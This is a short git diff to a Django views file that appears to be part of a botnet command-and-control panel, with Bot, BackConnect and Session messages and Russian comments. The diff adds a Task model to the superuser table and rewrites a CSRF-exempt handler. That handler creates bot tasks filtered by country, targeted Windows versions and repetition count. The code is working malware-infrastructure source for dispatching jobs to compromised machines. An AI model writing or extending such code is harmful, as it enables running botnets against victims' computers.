@@ -5,7 +5,7 @@ from django.contrib.auth.models import User
 from django.contrib.auth import login, logout
 from django.views.decorators.csrf import csrf_exempt
 from .bot_pb2 import BotMsg, BackConnectMsg, PanelMsg
-from .models import Bot, Session
+from .models import Bot, Session, Task
 import datetime
 import struct
 import requests
@@ -147,7 +147,7 @@ class AdminPanel:
     def admin_table(request):
         if not request.user.is_superuser:
             return HttpResponse('недостачно прав для просмотра')
-        return render(request, 'main/admin_table.html')
+        return render(request, 'main/admin_table.html', {'tasks': Task.objects.all()})
 
 
 # ГЛАВНЫЙ КЛАСС АДМИНКИ --------------------------- /\
@@ -318,7 +318,6 @@ class Handlers:
         host.ParseFromString(request.body)
         is_https = host.is_https
         domain = host.domain.decode('utf-16-le')
-        self.s[domain] = is_https
         return HttpResponse('200')
 
     @staticmethod
@@ -331,10 +330,20 @@ class Handlers:
     @csrf_exempt
     def create_task(self, request):
         data = request.POST
-        _true = [i for i in request.POST if data == 'true']
+        print(data)
+        name = data['name']
+        country = data['country']
+        _type = data['type']
+        _true = [i for i in request.POST if data[i] == 'true']
+        print(_true)
         wins = [i for i in _true if 'win' in i]
         x_oc = [i for i in _true if 'x' in i]
         print(wins, x_oc)
+
+        task = Task(name=name, country=country, type1=_type, win_os=':'.join(wins), x_oc=':'.join(x_oc), repetitions=data['reps'],
+                    done=0)
+        task.save()
+
         return HttpResponse('200')
 
 # ОБРАБОТЧИКИ -------------------------------------------- /
